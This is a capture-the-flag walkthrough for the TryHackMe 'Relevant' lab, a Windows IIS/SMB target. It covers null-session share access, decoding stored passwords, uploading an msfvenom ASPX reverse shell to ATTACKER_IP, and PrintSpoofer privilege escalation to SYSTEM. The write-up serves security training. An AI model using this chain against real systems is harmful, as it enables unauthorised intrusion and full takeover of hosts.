# [Relevant](https://tryhackme.com/room/relevant)

## Penetration Testing Challenge

# Pre-Engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

### User Flag

1. Perform a comprehensive port scan to identify all open services on the target machine. The `-sV` flag enables version detection, and `-p-` scans all 65535 ports.

```bash
nmap -sV -p- <TARGET_IP>
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 22:12 CET
Nmap scan report for 10.10.143.30
Host is up (0.067s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 354.75 seconds
```

2. Enumerate SMB shares to identify accessible network shares. The `-L` flag lists shares, and `-N` forces null authentication.

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.143.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The `nt4wrksv` share is non-standard and accessible without authentication, indicating a potential security misconfiguration.

3. Connect to the identified share and download any accessible files for analysis.

```bash
smbclient //<TARGET_IP>\\nt4wrksv -N
prompt off
get passwords.txt
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 5140085 blocks available
smb: \> prompt off
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

**passwords.txt contents:**

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

4. The passwords are Base64 encoded. Decode them using [CyberChef](https://gchq.github.io/CyberChef/)

**Decoded credentials:**

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

<img width="633" height="522" alt="SCREEN01" src="https://github.com/user-attachments/assets/39a52391-8648-406f-88ed-76285f95785e" />
<img width="545" height="520" alt="SCREEN02" src="https://github.com/user-attachments/assets/4241943a-6866-49ef-a8d6-38776a20cb77" />

5. Test the discovered credentials to determine access levels using `smbmap`. Both users provide the same access permissions.

```bash
smbmap -H <TARGET_IP> -u Bob -p '!P@$$W0rD!123'
smbmap -H <TARGET_IP> -u Bill -p 'Juw4nnaM4n420696969!$$$'
```

```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                               [|] Checking for open ports...                                                                                               [*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 10.10.143.30:445        Name: 10.10.143.30              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
[*] Closed 1 connections
```

Both users have READ and WRITE access to the `nt4wrksv` share, allowing file upload capabilities.

6. Verify write permissions and test if the SMB share is accessible via the web server on port 49663.

```bash
echo "TEST" > test.txt
smbclient //<TARGET_IP>/nt4wrksv -U Bob%'!P@$$W0rD!123'
put test.txt
```

Navigate to `http://<TARGET_IP>:49663/nt4wrksv/test.txt` in a browser. The file contents should display, confirming that:

- The SMB share is mapped to the IIS web server
- We can upload files that are executable via HTTP

<img width="566" height="121" alt="SCREEN03" src="https://github.com/user-attachments/assets/25f13ba1-fa20-4525-871f-4cc116030457" />

8. Create an ASPX reverse shell payload using `msfvenom`. ASPX is used because IIS natively supports ASP.NET.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx -o exploit.aspx
```

9. Start a Netcat listener on the attacker machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

Upload the malicious ASPX file to the writable SMB share:

```bash
smbclient //<TARGET_IP>/nt4wrksv -U Bob%'!P@$$W0rD!123'
put exploit.aspx
```

9. Navigate to `http://<TARGET_IP>:49663/nt4wrksv/exploit.aspx` in a browser to execute the payload. The IIS worker process will execute the ASPX code, establishing a reverse shell connection. Check the Netcat listener - you should receive a connection.

10. Navigate to Bob's desktop and read the user flag:

```bash
more c:\Users\Bob\Desktop\user.txt
```

<img width="376" height="59" alt="SCREEN04" src="https://github.com/user-attachments/assets/f8346a8a-ee5f-41d2-b3ef-b65bdfca7d5f" />

---

### Root Flag

1. Check the current privileges assigned to the compromised account. This reveals potential privilege escalation vectors.

```bash
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is enabled. This privilege allows the process to impersonate other users and is exploitable using tools like PrintSpoofer, JuicyPotato, or RoguePotato.

2. Download PrintSpoofer from the official GitHub repository:

- URL: `https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0`
- Download `PrintSpoofer64.exe` for 64-bit Windows systems

3. Start a simple HTTP server on the attacker machine to host the exploit binary:

```bash
python -m http.server
```

4. From the reverse shell, download PrintSpoofer and execute it to spawn a privileged shell:

```bash
powershell -ep bypass
wget http://<ATTACKER_IP>:8000/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe
./PrintSpoofer64.exe -i -c powershell.exe
whoami
```

<img width="544" height="175" alt="SCREEN05" src="https://github.com/user-attachments/assets/7b7b8a63-7c9a-482b-a0f9-040bc75148b1" />

5. Navigate to the Administrator's desktop and read the root flag:

```bash
dir c:\Users\Administrator\Desktop
more C:\Users\Administrator\Desktop\root.txt
```

<img width="555" height="243" alt="SCREEN06" src="https://github.com/user-attachments/assets/ac53dfd9-ce06-4ffd-a8b4-d320c1b91ed4" />
